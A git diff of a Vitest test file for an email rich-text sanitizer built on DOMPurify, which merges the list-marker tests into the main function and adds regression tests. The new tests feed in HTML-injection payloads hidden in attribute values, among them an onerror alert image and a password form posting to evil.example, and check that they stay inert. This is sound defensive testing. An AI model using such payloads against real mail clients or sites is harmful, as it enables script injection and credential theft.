@@ -1,9 +1,12 @@
+// @vitest-environment jsdom
+// jsdom for `DOMParser`, to parse the output the way a mail client would.
+import DOMPurify from "isomorphic-dompurify";
 import { describe, expect, test } from "vitest";
 import {
   NESTED_LIST_ITEM_CLASS,
   NESTED_LIST_ITEM_MARKER_STYLE,
 } from "@/modules/ui/components/editor/lib/example-theme";
-import { prepareEmailRichText, suppressNestedListMarkers } from "./preview-email-template-styles";
+import { prepareEmailRichText } from "./preview-email-template-styles";
 
 const marker = `style="${NESTED_LIST_ITEM_MARKER_STYLE}"`;
 
@@ -29,6 +32,21 @@ describe("prepareEmailRichText", () => {
     for (const fragment of forbidden) {
       expect(result).not.toContain(fragment);
     }
+  });
+
+  // DOMPurify on jsdom leaves `<` and `>` unescaped inside attribute values. Editing the sanitized
+  // string by tag boundaries would end a tag inside the value and turn the rest into live markup.
+  test.each([
+    ["a paragraph's class", '<p class="a><img src=x onerror=alert(1)>">t</p>'],
+    ["a paragraph's dir", '<p dir="x><form action=https://evil.example><input name=password>">t</p>'],
+    [
+      "a nested-list wrapper li's value",
+      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" value="1><img src=x onerror=alert(1)>"><ul><li>c</li></ul></li></ul>`,
+    ],
+  ])("keeps markup inside %s as text once the email's styles are added", (_case, html) => {
+    const parsed = new DOMParser().parseFromString(prepareEmailRichText(html), "text/html");
+
+    expect(parsed.body.querySelector("img, form, input, [onerror]")).toBeNull();
   });
 
   test("keeps what the editor writes and adds the email's paragraph spacing", () => {
@@ -57,46 +75,13 @@ describe("prepareEmailRichText", () => {
       `<ul><li class="${NESTED_LIST_ITEM_CLASS}" style="color:red"><ul><li>child</li></ul></li></ul>`,
       `<ul><li class="${NESTED_LIST_ITEM_CLASS}" ${marker}><ul><li>child</li></ul></li></ul>`,
     ],
-  ])("replaces an author's inline style on %s with the email's own", (_case, html, expected) => {
-    expect(prepareEmailRichText(html)).toBe(expected);
-  });
-
-  test("keeps encoded markup as text", () => {
-    expect(prepareEmailRichText("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")).toBe(
-      '<p style="margin:0">&lt;script&gt;alert(1)&lt;/script&gt;</p>'
-    );
-  });
-});
-
-describe("suppressNestedListMarkers", () => {
-  test.each([
     [
-      "a nested-list wrapper li",
-      `<ul><li class="${NESTED_LIST_ITEM_CLASS}"><ul><li>child</li></ul></li></ul>`,
-      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" ${marker}><ul><li>child</li></ul></li></ul>`,
-    ],
-    [
-      "the nested class among multiple classes, whatever the attribute order",
+      "a wrapper li with other classes and an ordered-list value",
       `<ol><li value="2" class="fb-editor-listitem ${NESTED_LIST_ITEM_CLASS}"><ol></ol></li></ol>`,
       `<ol><li value="2" class="fb-editor-listitem ${NESTED_LIST_ITEM_CLASS}" ${marker}><ol></ol></li></ol>`,
     ],
-    [
-      "a wrapper li without dropping its ordered-list value",
-      `<ol><li class="${NESTED_LIST_ITEM_CLASS}" value="3"><ol></ol></li></ol>`,
-      `<ol><li class="${NESTED_LIST_ITEM_CLASS}" value="3" ${marker}><ol></ol></li></ol>`,
-    ],
-    [
-      "a wrapper li by appending to its existing style instead of replacing it",
-      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" style="text-align: center"><ul></ul></li></ul>`,
-      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" style="text-align: center;${NESTED_LIST_ITEM_MARKER_STYLE}"><ul></ul></li></ul>`,
-    ],
-    [
-      "a wrapper li with single-quoted attributes",
-      `<ul><li class='${NESTED_LIST_ITEM_CLASS}'><ul></ul></li></ul>`,
-      `<ul><li class='${NESTED_LIST_ITEM_CLASS}' ${marker}><ul></ul></li></ul>`,
-    ],
-  ])("suppresses the marker on %s", (_case, html, expected) => {
-    expect(suppressNestedListMarkers(html)).toBe(expected);
+  ])("sets the email's own style on %s", (_case, html, expected) => {
+    expect(prepareEmailRichText(html)).toBe(expected);
   });
 
   test.each([
@@ -105,21 +90,22 @@ describe("suppressNestedListMarkers", () => {
       '<ul><li class="fb-editor-listitem" value="1">one</li><li>two</li></ul>',
     ],
     [
-      "class names that merely contain the nested class as a substring",
+      "class names that merely contain the nested class",
       `<ul><li class="${NESTED_LIST_ITEM_CLASS}-custom">item</li></ul>`,
     ],
-    ["html without list items", "<p>hello <strong>world</strong></p>"],
-  ])("leaves %s untouched", (_case, html) => {
-    expect(suppressNestedListMarkers(html)).toBe(html);
+  ])("leaves %s without a marker style", (_case, html) => {
+    expect(prepareEmailRichText(html)).toBe(html);
   });
 
-  test("is idempotent when applied twice", () => {
-    const html =
-      `<ul><li class="${NESTED_LIST_ITEM_CLASS}"><ul></ul></li>` +
-      `<li class="${NESTED_LIST_ITEM_CLASS}" style="text-align: right"><ol></ol></li></ul>`;
+  test("leaves later DOMPurify calls elsewhere in the app without the email's styles", () => {
+    prepareEmailRichText("<p>email</p>");
 
-    const once = suppressNestedListMarkers(html);
+    expect(DOMPurify.sanitize("<p>app</p>")).toBe("<p>app</p>");
+  });
 
-    expect(suppressNestedListMarkers(once)).toBe(once);
+  test("keeps encoded markup as text", () => {
+    expect(prepareEmailRichText("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")).toBe(
+      '<p style="margin:0">&lt;script&gt;alert(1)&lt;/script&gt;</p>'
+    );
   });
 });
